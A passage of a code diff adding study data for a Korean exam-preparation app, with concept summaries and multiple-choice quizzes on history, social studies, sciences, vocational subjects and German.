+            { title: "근현대 독립 운동", content: "일제 강점기에는 3·1 운동, 임시 정부, 무장 투쟁과 외교 활동이 전개됐다. 다양한 노선의 독립 운동이 병행되었으며, 광복 후 분단과 전쟁으로 이어지는 현대사의 맥락을 형성한다." }
+          ],
+          quizzes: [
+            { q: "삼한이 형성된 배경으로 옳은 것은?", options: ["철기 문화 확산", "석기 경제", "현대 산업", "왕권 약화", "외세 침략"], answer: 0, explanation: "철기 문화 확산이 삼한 형성의 기반이 되었다." },
+            { q: "조선의 통치 이념은?", options: ["불교", "도교", "성리학", "법가", "무속"], answer: 2, explanation: "조선은 성리학을 통치 이념으로 삼았다." },
+            { q: "3·1 운동의 의의로 옳은 것은?", options: ["일제 통치 강화", "임시 정부 수립", "분단 고착", "경제 개발", "군사 쿠데타"], answer: 1, explanation: "3·1 운동은 임시 정부 수립으로 이어졌다." }
+          ]
+        }
+      },
+      "사회탐구": {
+        "생활과 윤리": {
+          concepts: [
+            { title: "공리주의", content: "공리주의는 최대 행복 원리를 강조하며 행위의 결과가 도덕성을 결정한다. 벤담의 양적 공리주의와 밀의 질적 공리주의를 구분하고, 개인 권리 침해 가능성에 대한 비판을 이해해야 한다." },
+            { title: "칸트 의무론", content: "칸트는 정언명령을 통해 보편적 도덕 법칙을 강조했다. 인간을 수단이 아닌 목적으로 대우해야 하며, 동기와 의무 수행이 도덕성을 좌우한다." },
+            { title: "생명 윤리", content: "낙태, 안락사, 장기 이식 등 생명 윤리 쟁점에서 자기 결정권과 생명 존엄성의 균형이 중요하다. 다양한 입장을 비교하고 정당한 근거를 마련해야 한다." }
+          ],
+          quizzes: [
+            { q: "공리주의의 핵심 원리는?", options: ["최대 행복", "보편 법칙", "중용", "계약", "권리 우선"], answer: 0, explanation: "공리주의는 최대 행복을 강조한다." },
+            { q: "칸트 의무론의 핵심은?", options: ["결과", "동기와 보편화", "쾌락", "이익", "관습"], answer: 1, explanation: "칸트는 보편화 가능한 의무와 동기를 강조한다." },
+            { q: "생명 윤리 쟁점이 아닌 것은?", options: ["안락사", "낙태", "장기 이식", "신호 위반", "유전자 치료"], answer: 3, explanation: "신호 위반은 생명 윤리 쟁점이 아니다." }
+          ]
+        },
+        "윤리와 사상": {
+          concepts: [
+            { title: "유가 사상", content: "유가는 인의예지를 바탕으로 인간의 도덕성과 사회 질서를 강조한다. 군자와 소인 구분, 예를 통한 사회 안정이 핵심이며, 맹자는 성선설로 도덕성의 내재를 강조했다." },
+            { title: "도가 사상", content: "도가 사상은 자연에 따르는 무위자연을 강조한다. 인위적 규범을 줄이고 자연스러운 삶을 지향하며, 장자는 상대주의적 관점에서 자유와 해탈을 강조했다." },
+            { title: "서양 근대 사상", content: "홉스는 인간 본성을 이기적으로 보고 강력한 국가를 주장했고, 로크는 자연권과 사회 계약을 강조했다. 루소는 일반 의지를 통해 공동체의 자유를 중시했다." }
+          ],
+          quizzes: [
+            { q: "맹자의 성선설은 무엇을 강조하는가?", options: ["인간의 악함", "도덕성 내재", "완전 무지", "자연 방임", "권력 강화"], answer: 1, explanation: "맹자는 인간의 본성이 선하다고 본다." },
+            { q: "도가 사상의 핵심은?", options: ["무위자연", "법치", "경제 성장", "복지 확대", "사회 계약"], answer: 0, explanation: "도가 사상은 무위자연을 강조한다." },
+            { q: "로크의 핵심 주장으로 옳은 것은?", options: ["절대 군주", "자연권", "왕권신수설", "무정부", "폐쇄 사회"], answer: 1, explanation: "로크는 자연권과 사회 계약을 강조했다." }
+          ]
+        },
+        "한국지리": {
+          concepts: [
+            { title: "지형 특성", content: "한반도는 산지가 많고 동고서저 지형이 특징이다. 백두대간을 중심으로 하천과 평야가 발달하며, 지역별 지형 특성은 기후와 생활 방식에 영향을 준다." },
+            { title: "기후 요소", content: "한반도는 온대 계절풍 기후로 여름에는 고온다습, 겨울에는 한랭건조하다. 태풍, 장마, 한파 등 기후 요소는 농업과 산업 활동에 영향을 미친다." },
+            { title: "지역 산업", content: "수도권은 서비스·첨단 산업이 집중되고, 남해안은 조선·해운 산업이 발달한다. 지역별 산업 구조를 이해하면 인구 이동과 도시 성장의 원인을 분석할 수 있다." }
+          ],
+          quizzes: [
+            { q: "한반도 지형의 대표적 특징은?", options: ["서고동저", "동고서저", "평지 위주", "사막", "빙하"], answer: 1, explanation: "한반도는 동고서저 지형이 특징이다." },
+            { q: "여름철 장마는 어떤 기후 요인과 관련이 깊은가?", options: ["한랭 건조", "전선과 수증기", "강수 없음", "빙하 이동", "사막화"], answer: 1, explanation: "장마는 전선과 수증기가 결합해 발생한다." },
+            { q: "수도권 산업 구조의 특징은?", options: ["농업 중심", "첨단·서비스 집중", "광업 중심", "어업 중심", "산림 중심"], answer: 1, explanation: "수도권은 첨단 산업과 서비스업이 집중된다." }
+          ]
+        },
+        "세계지리": {
+          concepts: [
+            { title: "기후대", content: "세계는 열대, 건조, 온대, 냉대, 한대 기후대로 구분된다. 기후 요소는 농업 방식과 생활 문화, 경제 활동에 큰 영향을 미친다." },
+            { title: "인구 분포", content: "인구는 경제적 기회와 자연 조건에 따라 집중된다. 해안과 하천 주변, 온대 지역에 인구가 몰리며, 사막·고산 지역은 인구 밀도가 낮다." },
+            { title: "세계화와 교류", content: "세계화는 교통·통신 발달로 지역 간 교류를 촉진한다. 그러나 문화 동질화와 지역 격차를 심화시킬 수 있으므로 균형적 시각이 필요하다." }
+          ],
+          quizzes: [
+            { q: "열대 기후대의 특징은?", options: ["한랭", "고온다습", "건조", "강설", "빙설"], answer: 1, explanation: "열대 기후대는 고온다습이 특징이다." },
+            { q: "인구가 집중되는 지역은?", options: ["사막", "극지", "해안·하천", "고산", "사막 내부"], answer: 2, explanation: "해안과 하천 주변에 인구가 집중된다." },
+            { q: "세계화의 부정적 영향은?", options: ["교류 확대", "문화 동질화", "정보 확산", "기술 공유", "협력 증대"], answer: 1, explanation: "세계화는 문화 동질화를 초래할 수 있다." }
+          ]
+        },
+        "동아시아사": {
+          concepts: [
+            { title: "중국 고대 제국", content: "진·한 제국은 중앙집권 체제를 확립하며 동아시아 질서의 기반을 마련했다. 군현제, 유교 이념, 한자 문화가 확산되어 주변 국가에 영향을 주었다." },
+            { title: "동아시아 교류", content: "동아시아는 조공·책봉 체제를 통해 외교 관계를 맺었으며, 불교와 유교, 과학 기술이 교류되었다. 한중일 문화의 공통성과 차이를 이해하는 것이 중요하다." },
+            { title: "근대 전환", content: "19세기 이후 서구의 침략으로 동아시아는 개항과 개혁을 겪었다. 청일전쟁, 러일전쟁은 지역 질서의 변화를 가져왔고, 각국의 근대화 전략이 달랐다." }
+          ],
+          quizzes: [
+            { q: "진·한 제국의 특징은?", options: ["분권", "군현제", "봉건 해체", "이슬람", "자급자족"], answer: 1, explanation: "진·한은 군현제를 통해 중앙집권을 강화했다." },
+            { q: "동아시아 교류의 대표적 종교는?", options: ["불교", "힌두교", "이슬람", "기독교", "토착신앙"], answer: 0, explanation: "불교가 동아시아 교류의 대표적 종교였다." },
+            { q: "동아시아 근대 전환의 계기 중 하나는?", options: ["봉건 강화", "서구 침략", "고립 유지", "농업 쇠퇴", "무역 금지"], answer: 1, explanation: "서구 침략이 개항과 근대 전환을 촉발했다." }
+          ]
+        },
+        "세계사": {
+          concepts: [
+            { title: "고대 문명", content: "메소포타미아, 이집트, 인더스, 황허 문명은 하천 유역에서 발생했다. 농업과 도시 발전, 문자와 법 제도의 등장으로 인류 문명의 기반을 마련했다." },
+            { title: "중세 유럽", content: "중세 유럽은 봉건제와 가톨릭 교회의 영향 아래 있었다. 장원제, 십자군 전쟁, 도시의 성장 등 변화가 나타났고, 르네상스로 이어졌다." },
+            { title: "근대 혁명", content: "근대는 시민 혁명과 산업 혁명으로 특징된다. 미국 독립, 프랑스 혁명은 민주주의 확산의 계기가 되었고, 산업 혁명은 경제 구조와 사회 구조를 변화시켰다." }
+          ],
+          quizzes: [
+            { q: "고대 문명의 공통 조건은?", options: ["사막", "하천 유역", "빙하", "고산", "해양"], answer: 1, explanation: "대부분 하천 유역에서 발생했다." },
+            { q: "중세 유럽 사회 구조는?", options: ["자본주의", "봉건제", "사회주의", "무정부", "시장 자유"], answer: 1, explanation: "중세 유럽은 봉건제가 중심이었다." },
+            { q: "근대 혁명의 결과로 옳은 것은?", options: ["민주주의 확산", "봉건 강화", "왕권 강화", "농노제 부활", "고립주의"], answer: 0, explanation: "시민 혁명은 민주주의 확산에 기여했다." }
+          ]
+        },
+        "경제": {
+          concepts: [
+            { title: "시장과 가격", content: "시장은 수요와 공급이 만나는 곳이며, 가격은 희소성을 반영한다. 가격의 변화는 자원 배분의 신호가 되어 생산과 소비를 조정한다." },
+            { title: "경제 성장", content: "경제 성장은 생산량 증가를 의미하며, 기술 혁신과 자본 축적, 노동 생산성이 핵심 요인이다. 성장과 분배의 균형을 고려해야 지속 가능한 발전이 가능하다." },
+            { title: "금융과 통화", content: "통화량과 금리는 경기 변동에 영향을 미친다. 중앙은행은 기준금리를 통해 물가 안정과 경기 조절을 수행하며, 금융 시장의 역할을 이해해야 한다." }
+          ],
+          quizzes: [
+            { q: "가격의 역할로 옳은 것은?", options: ["자원 배분 신호", "수요 무시", "공급 제거", "가격 고정", "소비 금지"], answer: 0, explanation: "가격은 자원 배분의 신호 역할을 한다." },
+            { q: "경제 성장의 핵심 요인은?", options: ["기술 혁신", "자원 고갈", "생산 중단", "무역 단절", "경기 침체"], answer: 0, explanation: "기술 혁신과 생산성 향상이 성장의 핵심이다." },
+            { q: "중앙은행의 주요 역할은?", options: ["세금 부과", "통화량 관리", "무역 규제", "교육 정책", "인구 조사"], answer: 1, explanation: "중앙은행은 통화량과 금리를 관리한다." }
+          ]
+        },
+        "정치와 법": {
+          concepts: [
+            { title: "민주주의 원리", content: "민주주의는 국민 주권과 권력 분립을 기반으로 한다. 자유 선거와 다수결, 기본권 보호가 핵심이며, 법치주의는 권력 남용을 제한한다." },
+            { title: "헌법과 기본권", content: "헌법은 국가의 기본 질서를 규정하며 국민의 기본권을 보장한다. 기본권은 자유권, 평등권, 사회권 등으로 구성되며 제한과 보호의 균형이 중요하다." },
+            { title: "사법 제도", content: "사법 제도는 법원의 독립성과 공정성을 통해 권리를 보호한다. 재판의 절차적 정의와 무죄 추정 원칙은 민주 사회의 핵심 가치다." }
+          ],
+          quizzes: [
+            { q: "민주주의의 핵심 원리는?", options: ["권력 집중", "국민 주권", "무력 통치", "신분제", "계급 독재"], answer: 1, explanation: "민주주의는 국민 주권이 핵심이다." },
+            { q: "헌법의 역할로 옳은 것은?", options: ["사적 계약", "국가 기본 질서 규정", "기업 규칙", "학교 규정", "관습"], answer: 1, explanation: "헌법은 국가의 기본 질서를 규정한다." },
+            { q: "사법 제도의 핵심 원칙은?", options: ["권력 종속", "무죄 추정", "임의 처벌", "비공개", "강제 자백"], answer: 1, explanation: "무죄 추정 원칙이 사법의 핵심이다." }
+          ]
+        },
+        "사회·문화": {
+          concepts: [
+            { title: "사회화", content: "사회화는 개인이 사회 규범을 내면화하는 과정이다. 가족, 학교, 또래 집단 등이 주요 사회화 기관이며, 사회화는 개인 정체성과 사회 질서 유지에 중요한 역할을 한다." },
+            { title: "문화 상대성", content: "문화는 각 사회의 고유한 가치 체계로, 다른 문화는 그 문화의 기준에서 이해해야 한다. 문화 상대성을 이해하면 편견을 줄이고 다양성을 존중할 수 있다." },
+            { title: "사회 불평등", content: "사회 불평등은 소득, 권력, 교육 기회 등 다양한 영역에서 나타난다. 구조적 요인과 개인 요인이 결합되어 불평등을 만들며, 정책을 통해 완화하려는 노력이 필요하다." }
+          ],
+          quizzes: [
+            { q: "1차 사회화 기관은?", options: ["가족", "정부", "기업", "시장", "국제기구"], answer: 0, explanation: "가족은 1차 사회화의 핵심 기관이다." },
+            { q: "문화 상대성의 의미는?", options: ["모든 문화 동일", "자문화 우월", "각 문화 고유 기준", "문화 배제", "문화 통합"], answer: 2, explanation: "문화 상대성은 각 문화의 고유 기준을 존중하는 태도다." },
+            { q: "불평등 완화 정책으로 적절한 것은?", options: ["교육 기회 확대", "소득 집중", "복지 축소", "차별 강화", "이동 제한"], answer: 0, explanation: "교육 기회 확대는 불평등 완화에 기여한다." }
+          ]
+        }
+      },
+      "과학탐구": {
+        "물리학Ⅰ": {
+          concepts: [
+            { title: "등가속도 운동", content: "등가속도 운동은 가속도가 일정한 운동이며, 위치-시간 그래프는 포물선, 속도-시간 그래프는 직선으로 나타난다. 그래프의 기울기와 면적을 이용해 속도와 변위를 구한다." },
+            { title: "에너지 보존", content: "역학적 에너지 보존은 마찰이 없을 때 운동 에너지와 위치 에너지의 합이 일정함을 의미한다. 에너지 변환 과정을 이해하면 낙하, 경사면 문제를 쉽게 해결할 수 있다." },
+            { title: "파동의 간섭", content: "간섭은 파동의 중첩으로 보강과 상쇄가 나타나는 현상이다. 경로 차이에 따라 간섭 조건이 결정되며, 정상파 형성과 관련된다." }
+          ],
+          quizzes: [
+            { q: "속도-시간 그래프의 면적은 무엇을 의미하는가?", options: ["가속도", "속도", "이동 거리", "질량", "힘"], answer: 2, explanation: "속도-시간 그래프의 면적은 이동 거리다." },
+            { q: "역학적 에너지 보존이 성립하려면?", options: ["마찰 존재", "외부 힘 없음", "에너지 손실", "속도 0", "시간 변화"], answer: 1, explanation: "비보존력이 없을 때 보존된다." },
+            { q: "간섭 조건의 핵심은?", options: ["경로 차", "질량", "온도", "압력", "부피"], answer: 0, explanation: "간섭은 경로 차에 의해 결정된다." }
+          ]
+        },
+        "화학Ⅰ": {
+          concepts: [
+            { title: "원자 구조", content: "원자는 원자핵과 전자로 구성되며, 전자 배치는 화학적 성질을 결정한다. 동위 원소는 원자 번호는 같고 질량수가 다른 원자이다." },
+            { title: "화학 결합", content: "이온 결합은 전자 이동으로, 공유 결합은 전자 공유로 형성된다. 결합 유형에 따라 물질의 녹는점, 전기 전도성 등이 달라진다." },
+            { title: "화학 평형", content: "정반응과 역반응 속도가 같아지는 상태가 평형이며, 르샤틀리에 원리에 따라 조건 변화에 대응한다. 평형 상수는 반응의 진행 정도를 나타낸다." }
+          ],
+          quizzes: [
+            { q: "동위 원소의 특징은?", options: ["원자 번호 다름", "질량수 다름", "전자 수 다름", "원자 번호 다름", "화학 성질 다름"], answer: 1, explanation: "동위 원소는 질량수가 다르다." },
+            { q: "이온 결합의 특징은?", options: ["전자 공유", "전자 이동", "금속 결합", "수소 결합", "분산"], answer: 1, explanation: "이온 결합은 전자 이동으로 형성된다." },
+            { q: "평형 이동을 설명하는 원리는?", options: ["보일 법칙", "르샤틀리에 원리", "샤를 법칙", "아보가드로", "달톤"], answer: 1, explanation: "조건 변화에 대응하는 원리다." }
+          ]
+        },
+        "생명과학Ⅰ": {
+          concepts: [
+            { title: "세포 구조", content: "세포는 생명 활동의 기본 단위이며, 핵, 세포막, 세포질로 구성된다. 세포소기관은 기능 분담을 통해 에너지 생산과 단백질 합성을 수행한다." },
+            { title: "유전의 법칙", content: "멘델의 유전 법칙은 분리와 독립의 원리를 통해 형질 전해를 설명한다. 유전자의 우열 관계와 표현형 비율을 이해하면 유전 문제를 해결할 수 있다." },
+            { title: "항상성", content: "항상성은 내부 환경을 일정하게 유지하는 기능이다. 신경계와 내분비계가 협력하여 체온, 혈당, 수분 균형을 조절한다." }
+          ],
+          quizzes: [
+            { q: "세포의 기본 구조 요소는?", options: ["핵", "세포막", "세포질", "모두", "없음"], answer: 3, explanation: "핵, 세포막, 세포질이 기본 구조다." },
+            { q: "멘델의 법칙 중 분리 법칙의 의미는?", options: ["유전자 혼합", "대립 유전자 분리", "모계 유전", "수평 전달", "복제"], answer: 1, explanation: "대립 유전자가 분리되어 전달된다." },
+            { q: "항상성 유지에 관여하는 기관은?", options: ["신경계", "내분비계", "순환계", "둘 다", "없음"], answer: 3, explanation: "신경계와 내분비계가 함께 조절한다." }
+          ]
+        },
+        "지구과학Ⅰ": {
+          concepts: [
+            { title: "지구의 구조", content: "지구는 지각, 맨틀, 핵으로 구성되며, 물리적 상태에 따라 판 구조가 형성된다. 지진파 분석을 통해 내부 구조를 추론한다." },
+            { title: "기상과 기후", content: "대기 순환과 기단, 전선은 기상 현상을 만든다. 계절별 기후 변화와 기압 배치를 이해하면 날씨 변화를 예측할 수 있다." },
+            { title: "우주와 별", content: "별의 진화는 질량에 따라 달라진다. 주계열성에서 적색 거성, 초신성, 백색 왜성, 중성자별로 변화한다. 별의 스펙트럼 분석은 온도와 성분을 알려준다." }
+          ],
+          quizzes: [
+            { q: "지구 내부 구조 중 가장 안쪽은?", options: ["지각", "맨틀", "외핵", "내핵", "해양"], answer: 3, explanation: "내핵이 가장 안쪽이다." },
+            { q: "기단과 전선은 무엇을 만든다?", options: ["기상 현상", "지진", "해일", "화산", "자기장"], answer: 0, explanation: "기단과 전선은 기상 현상을 만든다." },
+            { q: "별의 스펙트럼 분석으로 알 수 있는 것은?", options: ["별의 색", "온도와 성분", "별의 거리만", "별의 속도만", "별의 무게만"], answer: 1, explanation: "스펙트럼은 별의 온도와 성분 정보를 제공한다." }
+          ]
+        },
+        "물리학Ⅱ": {
+          concepts: [
+            { title: "단진동", content: "단진동은 일정한 주기로 반복되는 운동이다. 변위, 속도, 가속도의 위상이 다르며, 에너지는 운동과 위치 에너지 사이에서 전환된다." },
+            { title: "전자기장", content: "전기장과 자기장은 서로 유도될 수 있으며, 전자기파는 두 장의 진동으로 전파된다. 맥스웰 방정식은 전자기 현상의 통합적 설명을 제공한다." },
+            { title: "특수 상대성", content: "특수 상대성 이론은 광속 불변을 가정하고 시간 지연, 길이 수축을 설명한다. 상대 속도에 따라 시간과 공간 측정이 달라진다는 점을 이해해야 한다." }
+          ],
+          quizzes: [
+            { q: "단진동에서 에너지는 어떻게 변하는가?", options: ["고정", "운동·위치 에너지 전환", "열로만 변화", "사라짐", "무한 증가"], answer: 1, explanation: "운동과 위치 에너지로 전환된다." },
+            { q: "전자기파는 무엇의 진동으로 구성되는가?", options: ["전기장과 자기장", "중력", "압력", "밀도", "온도"], answer: 0, explanation: "전자기장은 전기장과 자기장의 진동이다." },
+            { q: "특수 상대성의 핵심 가정은?", options: ["광속 불변", "중력 없음", "시간 불변", "길이 불변", "가속도 무한"], answer: 0, explanation: "광속 불변이 핵심 가정이다." }
+          ]
+        },
+        "화학Ⅱ": {
+          concepts: [
+            { title: "반응 속도론", content: "반응 속도는 농도, 온도, 촉매의 영향을 받는다. 활성화 에너지를 낮추면 반응 속도가 증가하며, 반응 차수와 속도식을 통해 반응 메커니즘을 추론한다." },
+            { title: "산화·환원 전지", content: "산화·환원 반응은 전자의 이동을 포함하며, 전지는 전기 에너지를 생성한다. 전극에서 산화와 환원이 일어나는 위치를 구분하고 전지의 전위를 계산해야 한다." },
+            { title: "분광학 기초", content: "분광학은 물질이 빛을 흡수·방출하는 특성을 분석한다. 스펙트럼은 전자 에너지 준위 변화를 반영하며, 물질의 정성·정량 분석에 활용된다." }
+          ],
+          quizzes: [
+            { q: "반응 속도 증가 요인이 아닌 것은?", options: ["온도 상승", "촉매", "농도 증가", "표면적 증가", "농도 감소"], answer: 4, explanation: "농도 감소는 속도를 감소시킨다." },
+            { q: "전지에서 산화가 일어나는 곳은?", options: ["양극", "음극", "전해질", "외부 회로", "전지 내부"], answer: 1, explanation: "산화는 음극에서 일어난다." },
+            { q: "분광학이 분석하는 것은?", options: ["압력", "빛의 흡수·방출", "온도", "부피", "점도"], answer: 1, explanation: "분광학은 빛의 흡수와 방출을 분석한다." }
+          ]
+        },
+        "생명과학Ⅱ": {
+          concepts: [
+            { title: "유전자 발현", content: "DNA 정보가 RNA와 단백질로 발현되는 과정은 전사와 번역으로 나뉜다. 발현 조절은 환경 변화에 대응하는 핵심 기작이며, 프로모터와 조절 인자의 역할을 이해해야 한다." },
+            { title: "생태계 에너지 흐름", content: "에너지는 생산자에서 소비자, 분해자로 이동하며, 영양 단계마다 에너지 효율이 감소한다. 에너지 피라미드와 물질 순환을 통해 생태계의 안정성을 이해할 수 있다." },
+            { title: "면역 반응", content: "면역은 선천 면역과 후천 면역으로 구분된다. 항원-항체 반응과 기억 세포 형성은 질병 방어에 핵심이며, 백신의 원리를 설명하는 기반이 된다." }
+          ],
+          quizzes: [
+            { q: "전사 과정에서 생성되는 것은?", options: ["DNA", "RNA", "단백질", "지질", "탄수화물"], answer: 1, explanation: "전사는 DNA 정보를 RNA로 옮긴다." },
+            { q: "영양 단계가 높아질수록 에너지는?", options: ["증가", "감소", "불변", "무한", "주기"], answer: 1, explanation: "에너지 효율이 낮아져 감소한다." },
+            { q: "백신의 원리는 무엇을 이용하는가?", options: ["항체 기억", "혈액 응고", "호흡 조절", "소화", "재생"], answer: 0, explanation: "기억 세포 형성을 이용한다." }
+          ]
+        },
+        "지구과학Ⅱ": {
+          concepts: [
+            { title: "판 구조론", content: "지각은 여러 판으로 구성되며, 판의 이동으로 지진과 화산, 산맥이 형성된다. 발산형, 수렴형, 보존형 경계의 특징을 구분해야 한다." },
+            { title: "대기 대순환", content: "지구의 대기 대순환은 적도 저기압대와 아열대 고기압대, 극지방의 고기압을 형성한다. 이러한 순환은 기후대와 바람의 방향을 결정한다." },
+            { title: "우주 거리 측정", content: "천문학에서 거리를 측정할 때 연주시차, 표준 촛불 등을 사용한다. 방법에 따라 측정 가능한 거리 범위가 다르며, 우주 구조 이해에 핵심이다." }
+          ],
+          quizzes: [
+            { q: "수렴형 경계에서 주로 나타나는 현상은?", options: ["해령", "해구", "사막", "빙하", "평야"], answer: 1, explanation: "수렴형 경계는 해구와 화산 활동이 나타난다." },
+            { q: "대기 대순환의 주요 결과는?", options: ["기후대 형성", "지진", "해저 확장", "화산 폭발", "광물 생성"], answer: 0, explanation: "대기 대순환은 기후대 형성에 영향을 준다." },
+            { q: "연주시차는 무엇을 측정하는가?", options: ["별의 거리", "별의 온도", "별의 질량", "별의 밀도", "별의 밝기"], answer: 0, explanation: "연주시차는 별의 거리를 측정하는 방법이다." }
+          ]
+        }
+      },
+      "직업탐구": {
+        "성공적인 직업생활": {
+          concepts: [
+            { title: "직업 윤리", content: "직업 윤리는 전문성과 공공성을 기반으로 한 책임 있는 행동을 요구한다. 신뢰를 유지하기 위해 정직과 공정성을 강조하고, 이해 상충을 피하는 태도가 필요하다." },
+            { title: "커리어 설계", content: "커리어 설계는 자기 이해, 직업 탐색, 목표 설정으로 진행된다. 역량 분석과 경력 계획을 체계적으로 세우면 장기적 성장에 도움이 된다." },
+            { title: "조직 내 소통", content: "조직 내 소통은 명확한 정보 전달과 피드백이 핵심이다. 협업을 위해 역할 분담과 의사소통 규칙을 정립해야 하며, 갈등 관리 능력도 중요하다." }
+          ],
+          quizzes: [
+            { q: "직업 윤리의 핵심 요소는?", options: ["정직과 공정성", "무책임", "개인 이익", "비밀 은폐", "규칙 무시"], answer: 0, explanation: "정직과 공정성은 직업 윤리의 핵심이다." },
+            { q: "커리어 설계 첫 단계는?", options: ["목표 설정", "자기 이해", "직업 변경", "퇴사", "승진"], answer: 1, explanation: "자기 이해가 출발점이다." },
+            { q: "조직 소통에서 중요한 것은?", options: ["정보 은폐", "피드백", "독단", "무관심", "혼란"], answer: 1, explanation: "피드백은 소통의 핵심 요소다." }
+          ]
+        },
+        "농업 기초 기술": {
+          concepts: [
+            { title: "토양 관리", content: "토양의 물리적·화학적 성질을 개선하면 작물 생산성이 향상된다. 유기물 공급, 배수 관리, 토양 산도 조절이 중요하며, 토양 검사 결과를 활용해 비료를 계획한다." },
+            { title: "작물 생육", content: "작물의 생육은 빛, 온도, 수분, 영양분의 균형에 좌우된다. 생육 단계별로 관리 방법이 달라지며, 병해충 예방과 방제가 필수적이다." },
+            { title: "농업 기술 혁신", content: "스마트 농업은 센서와 데이터 분석을 활용해 생산성을 높인다. 자동 관수, 환경 제어, 드론 활용 등 기술 혁신은 노동력을 절감하고 품질을 높인다." }
+          ],
+          quizzes: [
+            { q: "토양 관리의 핵심 요소는?", options: ["배수", "유기물 공급", "산도 조절", "모두", "없음"], answer: 3, explanation: "배수, 유기물, 산도 조절이 모두 중요하다." },
+            { q: "작물 생육에 필수적 요소가 아닌 것은?", options: ["빛", "온도", "수분", "영양", "소음"], answer: 4, explanation: "소음은 작물 생육에 필수 요소가 아니다." },
+            { q: "스마트 농업의 특징은?", options: ["수작업 확대", "데이터 기반 제어", "전통 방식 고수", "생산량 감소", "자동화 금지"], answer: 1, explanation: "데이터 기반 제어가 핵심이다." }
+          ]
+        },
+        "공업 일반": {
+          concepts: [
+            { title: "생산 공정", content: "생산 공정은 원자재를 제품으로 바꾸는 과정이다. 설계, 가공, 조립, 검사 단계로 이루어지며, 품질 관리와 공정 효율이 핵심이다." },
+            { title: "기계 요소", content: "기계 요소는 동력 전달과 구조 지지를 담당한다. 기어, 베어링, 축, 스프링 등의 역할을 이해하면 기계 시스템의 설계와 유지보수가 가능하다." },
+            { title: "안전 관리", content: "산업 안전은 사고 예방과 작업자 보호를 위해 필수다. 위험 요인을 사전에 파악하고 안전 장비 사용, 작업 절차 준수가 중요하다." }
+          ],
+          quizzes: [
+            { q: "생산 공정의 기본 단계는?", options: ["설계-가공-조립", "조립-설계", "검사-폐기", "운송만", "판매"], answer: 0, explanation: "설계-가공-조립이 기본 단계다." },
+            { q: "기어의 역할은?", options: ["동력 전달", "용해", "절단", "연마", "건조"], answer: 0, explanation: "기어는 동력 전달에 사용된다." },
+            { q: "산업 안전의 목적은?", options: ["사고 예방", "생산 중단", "비용 증가", "절차 무시", "노동 축소"], answer: 0, explanation: "안전 관리의 핵심은 사고 예방이다." }
+          ]
+        },
+        "상업 경제": {
+          concepts: [
+            { title: "시장 구조", content: "완전 경쟁, 독점, 과점 등 시장 구조에 따라 기업의 가격 결정과 생산량이 달라진다. 시장 구조를 이해하면 경쟁 전략과 소비자 선택의 변화를 분석할 수 있다." },
+            { title: "마케팅 기초", content: "마케팅은 제품, 가격, 유통, 촉진의 4P 전략으로 구성된다. 소비자 분석과 시장 세분화를 통해 효과적인 판매 전략을 수립한다." },
+            { title: "회계 기본", content: "회계는 기업의 재무 상태를 기록하고 보고하는 체계다. 손익계산서와 재무상태표를 통해 수익과 자산, 부채를 파악한다." }
+          ],
+          quizzes: [
+            { q: "과점 시장의 특징은?", options: ["기업 다수", "소수 기업 지배", "완전 경쟁", "가격 불변", "시장 없음"], answer: 1, explanation: "과점은 소수 기업이 시장을 지배한다." },
+            { q: "4P 전략에 포함되지 않는 것은?", options: ["제품", "가격", "유통", "촉진", "인사"], answer: 4, explanation: "인사는 4P에 포함되지 않는다." },
+            { q: "재무상태표가 보여주는 것은?", options: ["매출 추이", "자산·부채", "광고 전략", "시장 점유율", "소비 패턴"], answer: 1, explanation: "재무상태표는 자산과 부채, 자본을 보여준다." }
+          ]
+        },
+        "수산·해운 산업 기초": {
+          concepts: [
+            { title: "수산 자원 관리", content: "수산 자원은 생태계 균형을 고려해 관리해야 한다. 어획량 규제, 금어기 설정, 양식 기술 개발이 지속 가능한 수산업을 지원한다." },
+            { title: "해운 물류", content: "해운 물류는 국제 무역의 핵심이다. 항만 운영, 선박 운항, 물류 체계의 효율성을 이해하면 해운 산업의 구조를 파악할 수 있다." },
+            { title: "해양 안전", content: "해양 안전은 선박 사고 예방과 환경 보호를 위한 필수 요소다. 항해 규정 준수, 비상 대응 훈련, 안전 장비 점검이 중요하다." }
+          ],
+          quizzes: [
+            { q: "수산 자원 관리 방법이 아닌 것은?", options: ["금어기", "어획량 규제", "무제한 포획", "양식 개발", "자원 조사"], answer: 2, explanation: "무제한 포획은 지속 가능하지 않다." },
+            { q: "해운 물류가 중요한 이유는?", options: ["국제 무역 지원", "농업 축소", "산림 보호", "관광 제한", "통신 차단"], answer: 0, explanation: "해운 물류는 국제 무역을 지원한다." },
+            { q: "해양 안전의 핵심 요소는?", options: ["항해 규정 준수", "무단 운항", "안전 장비 미사용", "점검 생략", "훈련 없음"], answer: 0, explanation: "항해 규정 준수가 핵심이다." }
+          ]
+        },
+        "인간 발달": {
+          concepts: [
+            { title: "발달 단계", content: "인간 발달은 영아기, 유아기, 아동기, 청소년기, 성인기, 노년기로 구분된다. 각 단계에서 신체, 인지, 정서 발달의 특징이 다르다." },
+            { title: "인지 발달", content: "피아제의 인지 발달 이론은 감각운동기, 전조작기, 구체적 조작기, 형식적 조작기로 구분된다. 발달 단계별 사고 능력의 차이를 이해해야 한다." },
+            { title: "사회성 발달", content: "사회성 발달은 가족, 학교, 또래 관계 속에서 이루어진다. 애착 형성과 사회적 규범 학습은 건강한 대인관계를 형성하는 기반이 된다." }
+          ],
+          quizzes: [
+            { q: "청소년기의 특징으로 옳은 것은?", options: ["정체성 탐색", "완전한 노화", "신체 성장 없음", "사회적 고립", "인지 발달 중단"], answer: 0, explanation: "청소년기는 정체성 탐색이 특징이다." },
+            { q: "피아제 이론에서 추상적 사고가 가능한 단계는?", options: ["감각운동기", "전조작기", "구체적 조작기", "형식적 조작기", "영아기"], answer: 3, explanation: "형식적 조작기에서 추상적 사고가 가능하다." },
+            { q: "애착 형성이 중요한 이유는?", options: ["대인관계 기반", "수학 능력", "공학 기술", "언어 억제", "신체 약화"], answer: 0, explanation: "애착은 대인관계 형성의 기반이 된다." }
+          ]
+        }
+      },
+      "제2외국어/한문": {
+        "독일어Ⅰ": {
+          concepts: [
+            { title: "기초 문장 구조", content: "독일어는 동사가 2위에 오는 어순이 기본이며, 의문문과 종속절에서 동사 위치가 달라진다. 주어-동사-목적어 구조를 정확히 이해해야 한다." },
+            { title: "명사의 성", content: "독일어 명사는 남성, 여성, 중성의 성을 가지며, 관사 변화가 필수이다. 성과 격을 맞춰 문장을 구성해야 정확한 의미 전달이 가능하다." },
